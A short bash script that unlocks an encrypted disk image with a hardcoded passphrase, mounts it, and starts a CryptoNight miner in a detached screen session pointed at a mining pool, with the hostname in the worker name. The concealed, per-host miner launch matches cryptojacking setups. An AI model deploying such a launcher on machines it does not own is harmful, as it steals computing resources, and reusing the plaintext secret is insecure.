#!/usr/bin/env bash
echo j6Vf0BnmYmp9aqgD | sudo cryptsetup luksOpen ~/img img -
sudo mount /dev/mapper/img /mnt
cd /mnt
screen -S wkr -d -m ./wkr -u zeekay.$HOSTNAME -o us-east.cryptonight-hub.miningpoolhub.com:20580
